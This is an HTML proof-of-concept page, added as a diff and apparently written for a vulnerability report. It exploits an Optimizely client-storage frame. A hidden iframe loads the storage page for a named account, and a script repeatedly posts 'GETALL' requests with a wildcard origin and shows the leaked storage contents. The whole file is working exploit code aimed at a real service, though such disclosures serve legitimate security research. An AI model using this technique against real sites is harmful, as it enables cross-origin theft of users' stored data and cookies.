@@ -1,0 +1,38 @@
+<!doctype html>
+<html>
+<head>
+  <title>Proof of Concept</title>
+  <style>
+  iframe {
+    display: none;
+  }
+  </style>
+</head>
+<body>
+  <iframe id="victim-iframe"></iframe>
+  <div id='cookie'>Loading...</div>
+  <script>
+
+  var target_account = 5935064;
+  var is_pci = false;
+
+  var iframe_url = `https://a${target_account}.cdn${is_pci ? "-pci" : ""}.optimizely.com/client_storage/a10522694316.html`;
+
+  var interval;
+
+  window.addEventListener('message', function(e) {
+    var msg = JSON.parse(e.data);
+    if (msg.id === "foo") {
+      document.getElementById("cookie").innerText = JSON.stringify(msg.response);
+      clearInterval(interval);
+    }
+  })
+
+var vframe = document.getElementById("victim-iframe");
+vframe.src = iframe_url;
+var interval = setInterval(function() {
+  vframe.contentWindow.postMessage(JSON.stringify({type:"GETALL", id:"foo"}), "*");
+}, 10);
+  </script>
+</body>
+</html>
